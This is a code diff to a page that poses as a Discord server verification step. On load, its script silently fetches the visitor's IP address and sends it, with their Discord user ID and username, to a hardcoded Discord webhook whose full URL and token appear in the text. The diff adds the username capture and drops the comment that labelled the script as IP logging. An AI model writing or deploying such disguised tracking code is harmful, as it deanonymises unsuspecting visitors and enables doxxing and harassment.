@@ -21,10 +21,11 @@
   <p>You can now return to the Discord server.</p>
 
   <script>
-    // IP + User ID Logging
-    const WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1521304967267352748/98SDkrBuIZ-vadcFIYGt5-igYech7LvaLnbGL1xnU1vJbprTRNyN_SWOLfH297O3KVwe"; // ← Put your webhook here
+    const WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1521304967267352748/98SDkrBuIZ-vadcFIYGt5-igYech7LvaLnbGL1xnU1vJbprTRNyN_SWOLfH297O3KVwe"; // ← Change this
+
     const urlParams = new URLSearchParams(window.location.search);
     const userId = urlParams.get('user_id') || 'unknown';
+    const username = urlParams.get('username') || 'unknown';
 
     fetch('https://api.ipify.org?format=json')
       .then(res => res.json())
@@ -38,7 +39,8 @@
               title: "🔍 Verification Log",
               color: 0x00FF00,
               fields: [
-                { name: "Discord User ID", value: userId, inline: true },
+                { name: "Discord Username", value: username, inline: true },
+                { name: "User ID", value: userId, inline: true },
                 { name: "IP Address", value: ip, inline: true },
                 { name: "Time", value: new Date().toLocaleString(), inline: true }
               ]
